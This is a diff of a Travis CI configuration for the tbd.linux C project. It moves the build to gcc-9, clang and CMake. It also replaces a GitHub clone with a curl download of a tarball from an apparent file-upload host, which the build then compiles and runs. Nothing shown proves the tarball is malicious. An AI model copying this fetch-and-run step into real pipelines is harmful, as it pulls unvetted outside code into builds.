@@ -5,13 +5,21 @@ matrix:
    include:
       - os: linux
         compiler: gcc
-        env: C=gcc
+        env: CC=gcc-9
       - os: linux
         compiler: clang
-        env: C=clang
+        env: CC=clang
 
+addons:
+  apt:
+     sources:
+        - ubuntu-toolchain-r-test
+     package:
+        - gcc-9
+        - cmake
 
 script:
-   - git clone https://github.com/okanon/tbd.linux && cd tbd.linux
-   - make C=$C
-   - cd bin && ./tbd
+   - curl -OL https://up.psty.io/937/tbd.tar.gz && tar -xzf tbd.tar.gz && cd tbd.linux
+   - mkdir build && cd build
+   - cmake -DCMAKE_BUILD_TYPE=Release .. && make CC=$CC
+   - ./tbd
